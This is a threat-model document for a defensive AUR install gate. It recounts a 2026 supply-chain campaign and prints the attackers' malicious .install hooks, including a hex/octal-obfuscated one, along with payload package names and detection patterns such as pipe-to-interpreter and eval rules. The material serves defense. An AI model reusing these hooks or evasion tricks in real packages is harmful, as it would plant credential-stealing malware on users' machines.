# Threat Model

The canonical design ledger is [design-ledger.md](design-ledger.md). This
document is a focused extraction of the threat model — what we're defending
against and why the rules look the way they do.

## Attacker profile

The May–June 2026 AUR supply-chain attack — documented in real time on the
`aur-general` mailing list ([archive](https://lists.archlinux.org/archives/list/aur-general@lists.archlinux.org/),
~300 messages, snapshot from 2026-06-26) — followed this pattern:

1. **Creates burner accounts** with throwaway emails on the AUR. At least
   nine burner accounts were identified, including `franziskaweber`,
   `tobiaswesterburg`, `ellenmyklebust`, `vitoriapires`, `catringiess`,
   `dominikgross`, `meryemplath`, `laurentbavaud`, `ivonahruskova`.
2. **Adopts orphaned packages** (automatic adoption, no review required).
   Targets included `gnome-randr-rust`, `rtspeccy-git`, `pypiserver`,
   `python-dbapi-compliance`, `anythingllm-cli-bin`, `alvr`, `workbench`,
   `guiscrcpy`, `netmon-git`, `htbrowser-bin`, and dozens more.
3. **Pushes a commit adding an `.install` hook** that runs a JS package
   manager to pull a malicious npm package. The npm package contains a
   `package.json` with a `"preinstall"` script pointing to an ELF binary
   (e.g. `"./src/hooks/deps"`). The binary exfiltrates data: Telegram
   `tdata` directories, browser profiles, SSH keys.
   Payload npm packages observed: `atomic-lockfile`, `crypto-javascript`,
   `lockfile-js`, `nextfile-js`, `js-digest`, `yargs`, `chalk`, `minimist`,
   `ansicolor`.
4. **Impersonates the prior maintainer** — keeps the original author name in
   the git commit, swaps the email domain — so the diff looks like a routine
   maintainer update at a glance. movq and Ilaï Deutel both reported being
   impersonated this way on their own packages.
5. **Iterates obfuscation across three waves** (see below).

The attacker rotates package names, installer commands, and accounts faster
than blacklists can track. Static name lists are a losing race.

## Defensive design principles

### Structural pattern detection, not blacklists

The attacker rotates names faster than blacklists can track, so aur-safe
detects *structural patterns* rather than payload names:

- **JS package managers** (npm/pnpm/bun/yarn) are **hard-fail** — they are the
  primary campaign vector and have no legitimate use in aur-safe's audit
  surface (`.install` hooks, `PKGBUILD` install functions).
- **Other package managers** (pip/gem/cargo/go) are **review-only** — they have
  legitimate use in real AUR packages (Python/Ruby/Rust tooling).
- **Hex/octal escape runs** (2+ adjacent) are hard-fail — they spell out hidden
  strings. Single escapes are review-only (could be ANSI color codes).
- **Pipe-to-interpreter** (`curl … | sh`) and **eval-of-substitution**
  (`eval $(...)`) are hard-fail — they execute arbitrary fetched content.
- **Maintainer and `source=()` domain drift** is flagged (review) — this catches
  the impersonation signal without blocking legitimate version bumps.

### The LLM is never on the trust path

The gate is deterministic regex rules. The LLM (`explain` subcommand) is an
on-demand second opinion on *already-flagged* diffs — advisory only. This is
settled; do not propose LLM-in-the-loop gating.

### The trust anchor is decoupled from the helper

`~/.cache/aur-safe/accepted/<pkgbase>` is aur-safe's own trust anchor, not the
helper's HEAD. It means *the commit we audited, not what got installed* — a
TOCTOU window between the gate's fetch and the helper's is resolved by staging
(`staged/`) and promoting only on version-confirmed install (`accept`). Any
change that lets the anchor advance to an unaudited commit reopens the original
bug this project was built to fix.

## Rule classification rationale

| Class | Examples | Gate behavior |
|---|---|---|
| **Hard-fail** | npm/pnpm/bun/yarn, pipe-to-interpreter, eval-subst, base64-decode, escape runs (2+) | Block (exit 1) |
| **Review** | pip/gem/cargo/go, single hex/octal escape, maintainer/source drift, python-inline-net | Warn (exit 2) |

The asymmetry (JS package managers → hard-fail, others → review) is intentional:
the observed campaign uses JS package managers; Python/Ruby/Rust/Go legitimate
use is more common in real AUR packages. This is a judgment call documented as a
genuinely contestable decision in design-ledger.md.

## Primary vector: `.install` hooks

The campaign's payload rides in `.install` hooks running a JS package manager
to pull a malicious npm package. The npm package's `package.json` contains a
`"preinstall"` script (`"./src/hooks/deps"` or similar) — an ELF binary that
exfiltrates local data at `npm install` time.

aur-safe hard-fails on:

- **New or modified `.install` files** (`install-hook-ref`, `install-hook-func`)
  — any reference to a `.install` file, or any `post_install`/`pre_install`/
  `post_upgrade`/`pre_remove`/`post_remove` shell function definition.

These rules are the primary defense. Everything else (package managers, escapes,
network) defends against payloads that avoid the `.install` mechanism.

## Obfuscation arms race (three documented waves)

The June 2026 campaign evolved through three distinct waves, each adding
layers of obfuscation. aur-safe counters with structural patterns that don't
depend on specific obfuscation tricks.

### Wave 1 (June 11) — plaintext npm install

Straightforward `.install` hooks:

    post_install() {
        npm install atomic-lockfile yargs
    }

Detected by kpcyrd within hours. The npm package `atomic-lockfile` contained
`package.json` → `"scripts": {"preinstall": "./src/hooks/deps"}` → ELF binary.
kpcyrd notified npmjs.com; the package was removed.

### Wave 2 (June 12) — bun, alternate packages

Switched from `npm` to `bun` (the JS runtime/package-manager), and rotated to
new payload names:

    bun add nextfile-js ansicolor

Also targeted different packages (`guiscrcpy`, `netmon-git`). Same structural
pattern: JS package manager in a `.install` hook.

### Wave 3 (June 14) — shell escape obfuscation

Added obfuscation to evade string-matching scanners. Example from
`htbrowser-bin` (detected by Nicolas Boichat's local Gemma model):

    post_install() {
        $'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a'"d"'d' \
        $'\141\x6e''s'"i""-"$'\143''o''l''o''r'$'\x73' \
        'n'"e""x""t""f"'i''l''e''-''j''s'
    }

Mixed quoting (`$'\xNN'`, `"..."`, `'...'`) and hex/octal escape runs spell
out `cd /tmp && bun add ansicolor nextfile-js`. This is why aur-safe detects
hex/octal escape *runs* (2+ adjacent) as hard-fail, and why single-escape
whitelisting is a trap — the attacker mixes `\x63`, `\141`, `\x6e`, `\143`,
`\x73` etc. interchangeably with plain characters and quote-concatenation.

### Structural counter-patterns (aur-safe rules)

- **Hex/octal escape runs** — two adjacent `\xNN` or `\NNN` sequences spell
  hidden strings. Single escapes are review-only (ANSI color codes are `\x1b`,
  `\033`). No whitelist of "safe" escape codes — a name-list whitelist is
  itself an evasion surface (attacker sprinkles `\x1b` decoys, hides real
  payload in the middle).
- **Alternate interpreters** — `| python`, `| node`, `| ruby`, `| perl` in
  addition to `| sh`/`| bash`.
- **JS package managers** — `npm install`, `bun add`, `pnpm install`,
  `yarn add`. All are hard-fail in `.install` hooks regardless of quoting
  style, because the campaign's payload delivery mechanism is fundamentally
  "JS package manager in a hook".

## Why not a pacman hook

Pacman hooks run *after* install — by then the malicious `.install` has already
executed. Interception must happen before makepkg/pacman, hence the shell
wrapper around yay/paru. Also discussed in [design-ledger.md](design-ledger.md) §Architecture.

## Homograph attacks (unaddressed vector)

Tom Hale raised an additional vector on the `aur-general` list (2026-06-17):
IDN homograph attacks in `source=()` URLs. Example:

    source=('https://install.example-cli.dev')    # safe, Latin 'i'
    source=('https://іnstall.example-clі.dev')    # malicious, Cyrillic 'і' (U+0456)

The two URLs are visually indistinguishable in most terminals and diffs, but
the second resolves to a different server. Browsers display these as punycode
(`xn--nstall-ovf.xn--example-cl-62i.dev`), but `makepkg` does not.

This vector is **not currently addressed** by aur-safe. A homograph-altered
source URL would produce different checksums, but `SKIP` sums (common for git
packages) provide no protection. A future defense could flag source URLs
containing non-ASCII characters that would punycode-decode to a different
domain than the ASCII rendering suggests.

## Related tools (community response)

The attack spawned several independent scanner projects on the `aur-general`
list. These are not part of aur-safe but informed its design and may be useful
as second opinions:

- **srcaudit** (Claudia Pellegrino / auerhuhn@archlinux.org) — pluggable
  makepkg integration for upstream source auditing. Designed with the same
  PKGBUILD-trust assumption as aur-safe: it verifies upstream sources but
  acknowledges a malicious PKGBUILD can `options=('!srcaudit')` to disable it.
  Hexora drop-in shipped first; the architecture supports additional scanners.
- **Atomdrift** (Thomas Stromberg, Apache 2.0) — deterministic local AI
  platform using tree-sitter and rizin for binary analysis, immune to
  obfuscation. Arch pipeline results at https://lab.atomdrift.org/arch/.
- **AURSCAN** (Andreas Reichel) — wraps yay, scans each package with Claude
  LLM before installing. Advisory only (like aur-safe's `explain`).

AUR registration was disabled on 2026-06-15 by Arch DevOps (artafinde) and
remained closed through at least 2026-06-24.
